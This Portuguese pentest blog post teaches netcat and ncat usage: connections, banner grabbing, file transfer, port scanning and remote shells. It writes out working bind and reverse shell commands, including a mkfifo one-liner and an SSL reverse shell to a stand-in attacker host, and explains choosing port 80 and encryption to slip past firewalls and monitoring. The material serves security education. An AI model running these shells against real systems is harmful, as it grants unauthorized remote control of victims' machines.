<!DOCTYPE html>
<html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Security Researcher in Reversing/Malware/Low Level fields">
    <meta name="Author" content="Midnight Reverser">
    <meta name="keywords" content="midnighthackings midnight-rev midnight">
    <link rel="stylesheet" href=https://blog.midnighthackings.com/css/syntax.css>
    <link rel="stylesheet" href=https://blog.midnighthackings.com/css/style.css>
    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
    <title>Midnight Hackings - #FimDaEscala6x1</title>
  </head><body><aside id="sidenav">
    <header>
    
        <a href=https://blog.midnighthackings.com/><img src="https://blog.midnighthackings.com/avatar.png" alt="avatar"></a>
        
    

    <a id="branding" href=https://blog.midnighthackings.com/>
        
            Midnight's Home
        
    </a>
    </header>

    <nav>
        
            		
            <a href="/posts"
                
            >
                <i class="fas fa-keyboard fa-ms"></i>
                <span>posts</span>
            </a>
        
            		
            <a href="/tags"
                
            >
                <i class="fas fa-tags fa-ms"></i>
                <span>tags</span>
            </a>
        
            		
            <a href="https://github.com/midnight-rev"
                
                    target="_blank"
                
            >
                <i class="fab fa-github fa-ms"></i>
                <span>github</span>
            </a>
        
            		
            <a href="/index.xml"
                
            >
                <i class="fas fa-rss fa-ms"></i>
                <span>RSS</span>
            </a>
        
            		
            <a href="/contact"
                
            >
                <i class="far fa-envelope"></i>
                <span>contact</span>
            </a>
        
    </nav>
</aside>
<main id="main">
            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
            <div class="content">
<code>
    <center>
    <p style="font-weight: bolder;color: red;"> Midnight Hackings apoia o fim da escala 6x1. </p>
    <p style="font-weight: bolder;color: red;">Todos nós trabalhadores devemos ter direito à vida além do trabalho! Trabalhadores unidos mudam o mundo.</p>
    </center>
</code>
    
    <h1 id="title">Pentest 0x00 - Netcat: O canivete suíço dos hackers</h1>
    
    
      
    <nav id="TableOfContents">
  <ul>
    <li><a href="#nc">nc</a>
      <ul>
        <li><a href="#exemplo-1---conectando-se-a-tcp">Exemplo 1 - Conectando-se a TCP</a></li>
        <li><a href="#exemplo-2---conectando-se-a-udp">Exemplo 2 - Conectando-se a UDP</a></li>
        <li><a href="#exemplo-3---conectando-se-ao-http--enumeração-de-versão">Exemplo 3 - Conectando-se ao HTTP &amp; enumeração de versão</a></li>
        <li><a href="#exemplo-4---fazendo-um-mini-chat">Exemplo 4 - Fazendo um mini-chat</a></li>
        <li><a href="#exemplo-5---enviando-e-recebendo-arquivos">Exemplo 5 - Enviando e recebendo arquivos</a></li>
        <li><a href="#exemplo-6---bind-shell">Exemplo 6 - Bind shell</a></li>
        <li><a href="#exemplo-7---reverse-shell">Exemplo 7 - Reverse shell</a></li>
        <li><a href="#exemplo-8---reverse-shell-nova-forma">Exemplo 8 - Reverse shell (nova forma)</a></li>
        <li><a href="#exemplo-9---modo-scan">Exemplo 9 - Modo scan</a></li>
      </ul>
    </li>
    <li><a href="#ncat">ncat</a></li>
  </ul>
</nav>
    <h1 id="introdução">Introdução</h1>
<p>Nessa série de postagens, iremos descrever ferramentas essenciais que serão úteis para diversos cenários de pentest.</p>
<p>Essas ferramentas servirão principalmente para execução de comandos, estabelecimento de <em>shells</em>, envio de arquivos e análise de pacotes de redes.</p>
<p>Hoje trataremos no Netcat, ou <code>nc</code>. O IP utilizado pode sofrer alterações de exemplo para exemplo, logo é importante que o leitor entenda as diferenças entre o IP da vítima e do atacante ao longo do texto.</p>
<h2 id="nc">nc</h2>
<p>Netcat, ou nc, é um software que permite interação com serviços disponíveis em uma rede, independente de usarem UDP ou TCP na camada de transporte. Em cenários de reconhecimento e enumeração, ele pode ser útil para realizar varredura por serviços, hosts e buscar por versões de aplicações que estão expostas na internet ou intranet.</p>
<p>É um software que já vem por padrão em várias distribuições linux, tornando-o uma ferramenta de interesse por invasores.</p>
<h3 id="exemplo-1---conectando-se-a-tcp">Exemplo 1 - Conectando-se a TCP</h3>
<p>O uso mais básico do netcat é descrito abaixo. Ele irá tentar fechar uma conexão TCP no host/porta especificado.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -v &lt;ip ou hostname&gt; &lt;porta&gt;
</span></span></code></pre></div><p>O argumento <code>-v</code> irá trazer informações úteis sobre a conexão. Caso ela tenha sucesso, como em <code>nc -v google.com 80</code>, teremos o seguinte resultado:</p>
<p><img src="img/dc9d654507bf494c879d332e62bf0d26.png" alt="039228c968ab16742ae149847c29f5ee.png"></p>
<p>Porém, caso a porta especificada não esteja aberta no alvo, teremos a seguinte saída:</p>
<p><img src="img/09b2b96009c04593af18985a49f57673.png" alt="0fb4321abb287b009d465a7fe0f875c8.png"></p>
<blockquote>
<p>Isso já nos dá a possibilidade de produzir um scanner de portas em shell script para identificar portas abertas em um host especificado.</p></blockquote>
<p>Quando conectado com sucesso ao <em>socket</em> (tupla ip:porta), é possível enviar e receber bytes pelos descritores de entrada padrão e saída/saída de erro padrão (stdin/stdout), respectivamente.</p>
<p>Nos próximos exemplos exploraremos a conexão UDP e os potenciais usos de envio e recebimento de bytes.</p>
<h3 id="exemplo-2---conectando-se-a-udp">Exemplo 2 - Conectando-se a UDP</h3>
<p>No exemplo passado, realizamos a conexão utilizando TCP como protocolo de camada de transporte. Existem protocolos da camada de aplicação, como o DNS, que não utilizam TCP e sim UDP.</p>
<p>Para se conectar a essas aplicações usando o netcat, passaremos a flag <code>-u</code>, de UDP:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -v -u &lt;ip ou hostname&gt; &lt;porta&gt;
</span></span></code></pre></div><p>Um exemplo prático é a comunicação com o DNS do Google:</p>
<p><img src="img/86bb73c6740d4c8ab3f1a948fa0719c6.png" alt="b5a41f312aefc344a7d8bad82d5fe990.png"></p>
<h3 id="exemplo-3---conectando-se-ao-http--enumeração-de-versão">Exemplo 3 - Conectando-se ao HTTP &amp; enumeração de versão</h3>
<p>Para comunicação HTTP, podemos realizar requisições manualmente através do netcat:</p>
<p><img src="img/90fc66082bdf41a1aae116475dc3c702.png" alt="b2ca1f131dfde5f01779afd4b3e72d5b.png"></p>
<p>Nesse caso, segundo as especificações do HTTP, na primeira linha de requisição temos que passar o método, o recurso a ser acesso e qual versão do HTTP deve ser utilizada nessa comunicação. Isso está descrito na <a href="https://datatracker.ietf.org/doc/html/rfc2616">RFC do HTTP</a>.</p>
<blockquote>
<p>Note que, caso você conheça o formato das requisições a serem realizadas para determinado protocolo, é possível utilizar o netcat para acessá-lo e utilizá-lo.</p></blockquote>
<p><strong>NOTA:</strong> Para HTTP, precisamos dar dois &ldquo;enter&rdquo; (tecnicamente, dois caracteres <em>carriage return</em> e <em>new line</em>) para que o servidor retorne as informações para o cliente (netcat). Isso é necessário pois podemos enviar headers após a solicitação de determinado recurso.</p>
<p>Em determinados servidores de hospedagem HTTP, um mesmo IP pode estar sendo utilizado para diversos domínios/aplicações. Nesses casos, torna-se necessário enviar o header <code>Host: dominio.com</code> especificando qual aplicação queremos acessar.</p>
<p><img src="img/5f7c4738e06c459b9b3adf6a203881c4.png" alt="821d403ac4cc732a7c2d0faef0ba47ec.png"></p>
<p>Note que nas imagens anteriores, a versão do servidor foi retornada na resposta. Isso vale para outros servidores e protocolos, e se chama <em>enumeração de versão</em>, algo vital em um pentest, pois a partir disso podemos buscar por vulnerabilidades ou possíveis fragilidades naquela versão específica do servidor.</p>
<h3 id="exemplo-4---fazendo-um-mini-chat">Exemplo 4 - Fazendo um mini-chat</h3>
<p>Uma das funções mais úteis do netcat é a possibilidade de utilizá-lo também como servidor. Para isso, iremos especificar três flags nos argumentos de linha de comando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">-n <span class="c1"># não resolve hostnames, ou seja, utiliza apenas os IPs encontrados nas interfaces de rede da máquina</span>
</span></span><span class="line"><span class="cl">-l <span class="c1"># de &#34;listening&#34;, ou seja, informa ao netcat que desejamos ouvir conexões (modo servidor)</span>
</span></span><span class="line"><span class="cl">-v <span class="c1"># modo verbose</span>
</span></span><span class="line"><span class="cl">-p <span class="c1"># define a porta que o netcat deve realizar um &#34;bind&#34;</span>
</span></span></code></pre></div><p>O comando final ficará assim:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -nlvp <span class="m">1337</span>
</span></span></code></pre></div><p><img src="img/cb3f4de66693490bafdbb20009da451d.png" alt="d2b31f0cc7459f38fdd85d370f8abb33.png"></p>
<p>Acima especificamos a porta TCP 1337 como &ldquo;bind&rdquo; do nosso servidor. Toda comunicação para o servidor do netcat deverá acontecer por ela.</p>
<p>Vamos, agora, conectar um outro terminal (ou outro host) e executar o netcat como cliente:</p>
<p><img src="img/edfb06174e374804b1e4c8958c9bb44b.png" alt="e0da6b28812093926c01e896e746c404.png"></p>
<p>Logo em seguida, no servidor nos é informado que há uma conexão estabelecida com nossa sessão:</p>
<p><img src="img/c56126136c2b4a6fbaf687257bfc07ac.png" alt="cf173adc2e8945c758e17d7e676451c0.png"></p>
<p>A partir de agora, é possível enviar e receber dados de qualquer um dos lados:</p>
<p>Envio de mensagem pelo servidor:
<img src="img/0d164c622d7644c2bc9d3ea5aaa0ecc0.png" alt="507f9b49e75d484a33b347787f113680.png"></p>
<p>Recebimento da mensagem pelo cliente:
<img src="img/47b8213bbb1e415097416b1bedef57f2.png" alt="7bbdd15559a4ad062d2630e45e23ca7d.png"></p>
<h3 id="exemplo-5---enviando-e-recebendo-arquivos">Exemplo 5 - Enviando e recebendo arquivos</h3>
<p>Como estamos utilizando uma shell para invocar o netcat, podemos redirecionar a entrada e saída padrão para que sejam arquivos. Dessa forma, podemos utilizar a ferramenta para envio de arquivos para um host remoto.</p>
<p>Por exemplo, para repassarmos um arquivo malicious.exe para uma vítima, faríamos:</p>
<p>Vítima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvp <span class="m">1337</span> &gt; malicious.exe
</span></span></code></pre></div><p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc ip_da_vitima <span class="m">1337</span> &lt; malicious.exe
</span></span></code></pre></div><p>Note que a vítima está utilizando o netcat como servidor e o atacante como cliente, mas também é possível realizar o processo contrário, como nos comandos a seguir:</p>
<p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvp <span class="m">1337</span> &lt; malicious.exe
</span></span></code></pre></div><p>Vítima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc ip_do_atacante <span class="m">1337</span> &gt; malicious.exe
</span></span></code></pre></div><p>Em ambos os casos, a vítima irá redirecionar a saída padrão (&gt;) para um arquivo chamado malicious.exe. Ou seja, todos os bytes que chegarem pelo netcat irão compor o arquivo final.</p>
<p>Quando o atacante redireciona a sua entrada padrão (&lt;) para o arquivo malicious.exe, o netcat irá enviar todos os bytes desse arquivo para a vítima.</p>
<p>Esse procedimento pode levar um tempo e o netcat não mostra informações da completude do envio, logo devemos esperar um momento até que todos os bytes sejam enviados. Como explicaremos em outras postagens, uma shell reversa e <em>exploits</em>, de uma forma geral, são arquivos pequenos, que não vão demorar para serem transferidos.</p>
<p>Nas imagens a seguir, foi realizado o primeiro procedimento descrito nessa seção. Após o envio, podemos confirmar que o arquivo recebido pela vítima realmente é um binário PE (EXE) com o comando <code>file</code>:</p>
<h3 id="exemplo-6---bind-shell">Exemplo 6 - Bind shell</h3>
<p>Uma <em>bind shell</em> é um dos tipos mais básicos de malware para controle de um alvo. O procedimento é o seguinte:</p>
<blockquote>
<ol>
<li>O atacante envia um arquivo malicioso para que a vítima execute. Esse malware irá habilitar um pequeno servidor (&ldquo;abrir uma porta&rdquo;) no computador do alvo.</li>
<li>O atacante irá, então, se conectar a esse pequeno servidor, utilizando o IP do alvo e a porta escolhida previamente.</li>
<li>Ao estabelcer a comunicação, o invasor poderá enviar comandos (como comandos do cmd, powershell ou bash) para que o alvo execute e envie a resposta.</li>
</ol></blockquote>
<p><img src="img/f59ba832934f48c28e5601af6fe05f8d.png" alt="b0460d7f499c3a40d5544795b40c8fa2.png"></p>
<p>Isso garante o controle remoto de um computador.
Para que não necessitemos (por hora) codificar um malware desse tipo, o netcat já consegue nos prover o necessário para realizar esse procedimento, ao passarmos o argumento <code>-e</code> para a vítima.</p>
<p><code>-e, --exec &lt;command&gt;       Executes the given command</code></p>
<blockquote>
<p>Note que nas versões mais recentes do Ubuntu, você deve baixar o <code>ncat</code>, versão do netcat distribuído pela nmap.org. Para que os comandos abaixo funcionem, executem antes <code>alias nc=ncat</code>.</p></blockquote>
<p>Além da opção <code>-e</code>, temos que repassar qual será o binário responsável por realizar o processamento e interpretação dos comandos. Em windows, podemos utilizar <code>-e cmd.exe</code> e em Linux <code>-e /bin/bash</code>.</p>
<p>O comando de uma vítima Linux ficará assim:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -nlvp <span class="m">1337</span> -e /bin/bash
</span></span></code></pre></div><p>Ao conectarmos com <code>nc ip_da_vitima 1337</code> e digitarmos algum comando reconhecido pelo <code>/bin/bash</code>, teremos o retorno:</p>
<p><img src="img/0a9e8afb2eae4d7985f864e920bb1833.png" alt="c65a5b8888678cfae5c654b004c180ed.png"></p>
<p>Isso nos permite executar código arbitrário, enviar arquivos, entre outras possibilidades. Supondo que a vítima seja um servidor que esteja exposto na internet, é possível ter acesso à rede interna a partir do conceito aprendido nessa seção.</p>
<h3 id="exemplo-7---reverse-shell">Exemplo 7 - Reverse shell</h3>
<p>O conceito de shell reversa surgiu devido a bloqueios padrão de ferramentas de segurança a nível de rede, como Firewalls, que geralmente bloqueiam requisições <em>inbound</em> para computadores da rede interna.</p>
<p>Isso é possível pois geralmente quem faz as requisições são os computadores da rede interna para um servidor externo (como o acesso a um webserver) e não o contrário.</p>
<p>Além disso, uma <em>bind shell</em> pode gerar um alerta suspeito no alvo devido ao processo de binding com uma porta. Um funcionário comum de escritório não necessita abrir um servidor em uma porta não-padrão no dia-a-dia.</p>
<p>Vamos entender o fluxo e as vantagens de se utilizar uma shell reversa:</p>
<blockquote>
<ol>
<li>O atacante irá subir um pequeno servidor na sua máquina</li>
<li>Ele enviará um pequeno malware para a vítima, que quando clicado irá tentar se comunicar com o servidor do atacante</li>
<li>O atacante irá enviar comandos para a vítima, que irá executar e retornar seu output</li>
</ol></blockquote>
<blockquote>
<p>Por vezes, esse tipo de servidor é chamado de servidor C2, C&amp;C ou command-and-control</p></blockquote>
<p><img src="img/f68a29657fa642c7bd72465f063995e9.png" alt="fdd20dfc61cf48992f4eb616c548b8cc.png"></p>
<p>Note que a diferença principal de uma shell reversa para uma shell bind é que o servidor estará do lado do atacante, permitindo mascarar o tráfego e evitar criar um servidor na vítima. A execução de comandos se dá da mesma forma que a bind shell.</p>
<p>Os comandos a serem executados para a realização de uma shell reversa via netcat são os seguintes:</p>
<p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -nlvp <span class="m">80</span>
</span></span></code></pre></div><p>Vítima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc ip_do_atacante <span class="m">80</span> -e /bin/bash
</span></span></code></pre></div><p>Lembrando que podemos mudar o interpretador para o <code>cmd.exe</code> ou qualquer outro que exista no ambiente.</p>
<p>Especificamos a porta 80 por uma razão bem importante: geralmente tráfego na porta 80/HTTP é liberado em diversas empresas, e logo não terá restrições de comunicação. Para um cenário simples de monitoramento de rede, é apenas uma conexão de um computador com um site, por exemplo.</p>
<h3 id="exemplo-8---reverse-shell-nova-forma">Exemplo 8 - Reverse shell (nova forma)</h3>
<p>Versões padrão do netcat podem não conter mais a opção <code>-e</code>, que torna o trabalho do pentester um pouco mais complicado.</p>
<p>Contudo, mesmo sem essa opção é possível utilizar a ferramenta para estabelecer uma shell reversa com o alvo. Para isso, utilizaremos parte da linha de comando do Netcat OpenBsd, disponível no github do <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd">Payload All The Things</a>.</p>
<p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -nlvp <span class="m">8080</span>
</span></span></code></pre></div><p>Vítima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mkfifo /tmp/f<span class="p">;</span> cat /tmp/f <span class="p">|</span> /bin/sh -i 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> nc attacker_ip <span class="m">8080</span> &gt;/tmp/f
</span></span></code></pre></div><ul>
<li><code>mkfifo /tmp/f</code>: A vítima irá criar um arquivo <em>FIFO</em> (named pipe, uma forma de comunicação interprocessos), em <code>/tmp/f</code>, para recebimento dos comandos do atacante e envio dos outputs.</li>
<li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc attacker_ip 8080 &gt;/tmp/f</code>: Essa segunda parte irá esperar e ler os comandos recebidos no named pipe (através do <code>cat</code>), passá-los para o processamento da shell <code>/bin/sh</code> e redirecionar a saída de erro para a saída padrão com <code>2&gt;&amp;1</code> (para que os erros também sejam enviados ao atacante). Por fim, o trecho  <code>nc attacker_ip 8080 &gt;/tmp/f</code> irá fazer o papel de ponte entre o atacante e a vítima, obtendo os comandos e enviando as saídas.</li>
</ul>
<p>Exemplo de resultado da execução:</p>
<p>Vítima:
<img src="img/25b06b26c705447c884120c67c80d9ab.png" alt="10accdb40d8fe972587d28e2d98425d3.png"></p>
<p>Servidor C2:
<img src="img/664eaf0b0d974db5a876c4e68f41ee27.png" alt="9997a10033b7c790e4ba863120dafb1d.png"></p>
<h3 id="exemplo-9---modo-scan">Exemplo 9 - Modo scan</h3>
<p>A fim de detectar serviços em um host, podemos utilizar o argumento <code>-z</code> passando o ip do host a ser escaneado e uma porta ou range de portas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -vz ip_host range_ports
</span></span></code></pre></div><p>Onde <code>range_ports</code> pode ser uma única porta ou um intervalo fechado no formato <code>porta_min-porta_max</code>.</p>
<p>Um exemplo da saída desse comando:</p>
<p><img src="img/b6c86b24db5446059fec66034a4a9d1e.png" alt="c3fecd7148edcbe25957bbf88b6726e0.png"></p>
<p>Nessa saída, podemos ver que do range de portas 75 a 85 do host, apenas a porta 80 estava aberta.</p>
<h2 id="ncat">ncat</h2>
<p>O ncat é a versão do netcat com suporte ao SSL/TLS. Essa vantagem permite a enumeração de alvos que utilizem esses protocolos, como o HTTPS, e ofuscação de comandos enviados para o destino em uma <em>shell</em> caso o alvo não realize inspeção TLS.</p>
<blockquote>
<p>Para instalá-lo em versões atuais do Ubuntu, use <code>sudo apt update -y &amp;&amp; sudo apt install ncat -y</code></p></blockquote>
<p>Por exemplo, se quisermos acessar o host <code>google.com</code> na porta 443 usando o <code>nc</code>, ao enviarmos qualquer requisição, a conexão é fechada:</p>
<p><img src="img/7cffbd653f5b42c7940d7317611f94fb.png" alt="38d4b2a524e98b61143ed0703a973188.png"></p>
<p>Já quando usamos o <code>ncat</code>, com o argumento <code>--ssl</code>, podemos digitar nossa requisição sem erros:</p>
<p><img src="img/556d19ebe22e40509048f915fb55b206.png" alt="8aaded7468f8d84b37275091000c6af3.png"></p>
<p>Importante notar que a maioria (senão todos) os comandos do netcat são válidos no <code>ncat</code>.</p>
<p>Logo, podemos criar um servidor que utiliza SSL e realizar um procedimento de shell reversa com uma vítima. Em cenários em que não há inspeção de tráfego SSL/TLS, esse é um método que pode mascarar os comandos que estão sendo enviados, pois eles estarão sendo enviados criptografados.</p>
<p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ncat --ssl -nlvp <span class="m">1337</span>
</span></span></code></pre></div><p>Vítima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ncat --ssl 127.0.0.1 <span class="m">1337</span> -e /bin/bash
</span></span></code></pre></div><p>Abaixo, o resultado do teste:</p>
<p><img src="img/1d441cb976c544b8b0d6bce013a2d919.png" alt="ea92062d958acf2753186db20f14bd59.png"></p>
<p><img src="img/41767c0223034340b16c905a1063ed76.png" alt="9a58c02d08c9fba2ff372524d54a1739.png"></p>

    
    <div class="nav-next-prev">
        <div class="nav-prev">
            
                <a class="grayed-out" href="javascript:void()"><i class="fas fa-chevron-left"></i></a>
            
        </div>
        <a class="nav-top" href="#">top</i></a>
        <div class="nav-next">
            
                <a href="https://blog.midnighthackings.com/posts/maldev-0x00/"><i class="fas fa-chevron-right"></i></a>
            
        </div>
    </div>
    

            </div><footer>
<div class="footer-content">

  <div class="contact-info">
      
          <div class="footer-mail">
          <i class="far fa-envelope"></i> <a href="mailto:midnight.reverser@outlook.com">midnight.reverser@outlook.com</a> </div>
      
      
  </div>


<img src="https://www.gnu.org/graphics/gplv3-with-text-136x68.png"/>
&nbsp;&nbsp;
<p class="copyright meta"> Midnight Hackings apoia GPL e o fim da escala 6x1!</p>

</div>
</footer></main>
    </body>
    <script src=https://blog.midnighthackings.com/js/navbutton.js></script>
</html>
